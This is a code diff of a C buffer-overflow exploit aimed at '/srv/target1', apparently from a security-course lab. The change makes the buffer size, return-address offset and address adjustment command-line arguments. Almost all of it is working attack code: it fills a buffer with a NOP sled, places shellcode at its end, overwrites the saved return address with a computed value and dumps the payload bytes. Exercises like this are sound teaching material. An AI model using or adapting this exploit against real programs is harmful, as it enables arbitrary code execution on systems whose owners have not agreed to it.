@@ -7,41 +7,40 @@
 
 #define TARGET "/srv/target1"
 
-const int BUFFER_SIZE = 500;
-const int OFFSET_TO_RET = 8;
-const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
-
 int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        fprintf(stderr, "Usage: %s <buffer_size> <offset_to_ret> <return_address_offset>\n", argv[0]);
+        exit(1);
+    }
+
+    int buffer_size = atoi(argv[1]);
+    int offset_to_ret = atoi(argv[2]);
+    int return_address_offset = atoi(argv[3]);
+
     char *args[3];
     char *env[1];
-    char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];
+    char buf[buffer_size];
 
     // Print the addresses of relevant variables and the shellcode length
     printf("Address of buf: %p\n", (void*)buf);
     printf("Address of argv[0]: %p\n", (void*)argv[0]);
     printf("Address of argv[1]: %p\n", (void*)argv[1]);
-    printf("Shellcode length: %d\n", SHELLCODE_LENGTH);
-
-    // Check if argv[1] is set, otherwise print an error and exit
-    if (argv[1] == NULL) {
-        fprintf(stderr, "Error: argv[1] is not set. Please provide an argument.\n");
-        exit(1);
-    }
+    printf("Shellcode length: %d\n", sizeof(shellcode) - 1);
 
     // Fill the buffer with NOP instructions (\x90)
     memset(buf, '\x90', sizeof(buf));
 
     // Copy the shellcode to the end of the buffer
-    memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);
+    memcpy(buf + sizeof(buf) - sizeof(shellcode), shellcode, sizeof(shellcode));
 
     // Calculate the return address based on argv[1] and print it
-    unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET + 200;
+    unsigned int return_address = (unsigned int)argv[1] + offset_to_ret + return_address_offset;
     printf("Chosen return address: 0x%x\n", return_address);
 
     // Overwrite the return address in the buffer
-    *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;
+    *(unsigned int*)(buf + offset_to_ret) = return_address;
 
-    // Print the contents of the buffer (up to 100 bytes) to verify the exploit setup
+    // Print the contents of the buffer to verify the exploit setup
     printf("Buffer contents:\n");
     for (int i = 0; i < sizeof(buf); i++) {
         printf("\\x%02x", (unsigned char)buf[i]);
